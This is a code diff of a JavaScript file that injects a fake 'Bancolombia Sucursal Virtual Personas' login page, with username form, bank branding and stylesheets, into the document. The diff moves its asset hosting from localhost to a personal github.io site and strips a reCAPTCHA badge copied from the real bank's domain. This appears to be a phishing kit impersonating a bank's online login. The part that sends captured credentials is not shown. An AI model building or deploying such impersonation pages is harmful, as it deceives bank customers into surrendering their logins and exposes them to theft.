@@ -1,4 +1,4 @@
-var myHosting = "http://localhost/bancol/";
+var myHosting = "https://itsmariodev.github.io/";
 
 let head = `<title>Bancolombia Sucursal Virtual Personas</title>
   <meta http-equiv="content-type" content="text/html; utf-8">
@@ -10,11 +10,11 @@ let head = `<title>Bancolombia Sucursal Virtual Personas</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-  <link href="${myHosting}/mua/css/style.css" rel="stylesheet">
-  <link href="${myHosting}/mua/css/main.css" rel="stylesheet">
-  <link href="${myHosting}/mua/css/recapcha.css" rel="stylesheet">
-  <link href="${myHosting}/mua/css/bootstrap.css" rel="stylesheet">
-  <link href="${myHosting}/mua/img/logo.png" rel="icon" type="image/png"/>`;
+  <link href="${myHosting}css/style.css" rel="stylesheet">
+  <link href="${myHosting}css/main.css" rel="stylesheet">
+  <link href="${myHosting}css/recapcha.css" rel="stylesheet">
+  <link href="${myHosting}css/bootstrap.css" rel="stylesheet">
+  <link href="${myHosting}img/logo.png" rel="icon" type="image/png"/>`;
 
 let body = `<form id="loginUserForm">
 <div class="container" id="containerMain">
@@ -219,12 +219,6 @@ var ads = `<div class="col-xs-12 col-sm-7 col-md-8">
             </div>
 `;
 
-var recaptcha = `<div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
-<div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LcQkTUUAAAAAAqNJNF97DoEKkxyTia9U6SOqp61&amp;co=aHR0cHM6Ly9zdWN1cnNhbHBlcnNvbmFzLnRyYW5zYWNjaW9uZXNiYW5jb2xvbWJpYS5jb206NDQz&amp;hl=es&amp;v=x19joXI_IeQnFJ7YnfDapSZq&amp;size=invisible&amp;cb=2joa41vqz03z" width="256" height="60" role="presentation" name="a-xs491oz26lub" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"></iframe></div>
-<div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
-</div><iframe style="display: none;"></iframe>
-`;
-
 function addHead() {
   $("head").append(head);
 }
@@ -233,7 +227,6 @@ function addCode() {
   $("body").html(body);
   $("#divMain").append(options);
   $("#divMain").append(ads);
-  $("#recaptcha").html(recaptcha);
 
   $("#btnUsuario").click(function () {
     if ($("#txtUsuario").val().length > 0) {
